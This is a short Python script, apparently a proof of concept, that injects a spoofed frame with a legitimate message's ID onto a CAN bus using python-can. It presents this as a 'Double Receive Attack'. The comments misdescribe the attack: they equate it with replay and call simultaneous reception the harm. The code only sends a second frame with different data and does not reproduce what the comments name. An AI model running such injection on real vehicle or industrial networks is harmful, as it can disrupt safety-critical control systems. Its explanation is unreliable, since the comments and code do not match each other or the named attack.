# A CAN bus Double Receive Attack is a type of attack on a Controller Area Network (CAN) bus, 
# where an attacker sends a message with the same identifier (ID) as a legitimate message, 
# causing two or more devices to receive the message simultaneously. This type of attack is 
# sometimes also referred to as a "replay attack" because the attacker is essentially 
# replaying a message already sent on the network.

# credits to Dr. Ken Tindell for discovering this attack 

import can

# Define the CAN bus interface
bus = can.interface.Bus(bustype='socketcan', channel='can0')

# Define the ID and data for the legitimate message
legit_id = 0x123
legit_data = b'\x11\x22\x33\x44'

# Send the legitimate message on the bus
legit_msg = can.Message(arbitration_id=legit_id, data=legit_data)
bus.send(legit_msg)

# Define the ID and data for the malicious message
mal_id = 0x123
mal_data = b'\x55\x66\x77\x88'

# Send the malicious message on the bus with the same ID as the legitimate message
mal_msg = can.Message(arbitration_id=mal_id, data=mal_data)
bus.send(mal_msg)
